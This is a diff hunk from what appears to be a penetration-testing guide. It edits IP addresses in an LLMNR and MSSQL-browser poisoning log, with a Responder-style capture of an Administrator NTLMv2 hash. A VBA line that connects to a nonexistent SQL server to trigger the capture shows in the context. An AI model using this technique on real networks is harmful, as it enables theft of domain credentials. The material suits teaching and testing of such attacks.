@@ -483,10 +483,10 @@ CreateObject("ADODB.Connection").Open "Provider=SQLNCLI11;Data Source=DOESNOTEXI
 > we captured the hash of the **Administrator** with this VBA script.
 ```python
 [+] Listening for events...
-[*] [LLMNR]  Poisoned answer sent to 10.1.2.3 for name doesnotexist
-[MSSQL-BROWSER] Sending poisoned browser response to 10.1.2.3
-[*] [LLMNR]  Poisoned answer sent to 10.1.2.3 for name doesnotexist
-[*] [LLMNR]  Poisoned answer sent to 10.1.2.3 for name doesnotexist
+[*] [LLMNR]  Poisoned answer sent to 10.10.14.33 for name doesnotexist
+[MSSQL-BROWSER] Sending poisoned browser response to 10.10.14.33
+[*] [LLMNR]  Poisoned answer sent to 10.10.14.33 for name doesnotexist
+[*] [LLMNR]  Poisoned answer sent to 10.10.14.33 for name doesnotexist
 [MSSQL] NTLMv2 Client   : 10.1.2.3
 [MSSQL] NTLMv2 Username : TEST\Administrator
 [MSSQL] NTLMv2 Hash     : Administrator::TEST:1122334455667788...
